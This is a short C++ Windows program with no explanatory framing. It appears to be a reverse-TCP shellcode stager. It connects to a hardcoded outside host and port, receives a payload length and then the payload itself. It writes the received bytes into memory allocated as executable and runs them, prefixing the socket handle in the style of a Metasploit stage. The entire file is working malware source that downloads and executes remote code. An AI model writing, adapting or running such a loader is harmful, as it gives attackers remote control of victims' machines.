#include <WinSock2.h>
#include <Windows.h>
#pragma comment(lib, "Ws2_32.lib")

unsigned char* rev_tcp(char* host, char* port);

unsigned long uIP;
unsigned short sPORT;
unsigned char *buf;
unsigned int bufSize;
char* LHOST;
char* LPORT;
LPWSTR *parsedArgv;
int dummy;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int CmdShow)
{
	size_t newsize = strlen(lpCmdLine) + 1;
	wchar_t * wcstring = new wchar_t[newsize];
	size_t convertedChars = 0;
	mbstowcs_s(&convertedChars, wcstring, newsize, lpCmdLine, _TRUNCATE);

	//if (__argc < 3){
	//	exit(-1);
	//}
	//parsedArgv = CommandLineToArgvW(lpCmdLine);
	//LHOST = __argv[1];
	//LPORT = __argv[2];

	buf = rev_tcp("8-0.co", "23235");

	(*(void(*)())buf)();
	exit(0);
}

unsigned char* rev_tcp(char* host, char* port)
{

	WSADATA wsaData;
	SOCKET sckt;
	struct sockaddr_in server;
	hostent *hostName;
	int length = 0;

	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0){
		exit(1);
	}

	hostName = gethostbyname(host);

	if (hostName == nullptr){
		exit(2);
	}

	uIP = *(unsigned long*)hostName->h_addr_list[0];
	sPORT = htons(atoi(port));

	server.sin_addr.S_un.S_addr = uIP;
	server.sin_family = AF_INET;
	server.sin_port = sPORT;

	sckt = socket(AF_INET, SOCK_STREAM, NULL);
	if (sckt == INVALID_SOCKET){
		exit(3);
	}

	if (connect(sckt, (sockaddr*)&server, sizeof(server)) != 0){
		exit(4);
	}

	recv(sckt, (char*)&bufSize, 4, 0);

	buf = (unsigned char*)VirtualAlloc(buf, bufSize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	buf[0] = 0xbf;
	strncpy((char*)buf + 1, (const char*)&sckt, 4);

	length = bufSize;
	int location = 0;
	while (length != 0){
		int received = 0;
		
		received = recv(sckt, ((char*)(buf + 5 + location)), length, 0);

		location = location + received;
		length = length - received;
	}

	return buf;
}